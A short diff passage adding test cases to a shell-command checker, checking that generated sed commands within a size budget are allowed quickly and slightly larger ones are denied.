+expect_fast ALLOW "one sed stage with a budget-size program" "sed '$(printf 'd;%.0s' {1..4094})' f"
+expect_fast ALLOW "eight sed stages of a thousand bytes" "$(printf "sed '$sd' | %.0s" {1..8})cat"
+expect_fast ALLOW "one sed stage with many -e values" "sed $(printf -- '-e d %.0s' {1..2900})f"
+expect_fast ALLOW "many sed stages" "$(printf 'sed p | %.0s' {1..1900})cat"
+expect_fast ALLOW "one sed stage of bracketed commands read both ways" "sed '$(printf 's/[a]/b/;%.0s' {1..680})' f"
+expect_fast DENY "a sed program over the budget" "sed '$(printf 'd;%.0s' {1..4200})' f"
+expect_fast DENY "sed programs over the budget in total" "$(printf "sed '$sd' | %.0s" {1..9})cat"
 big_rows
 }
 
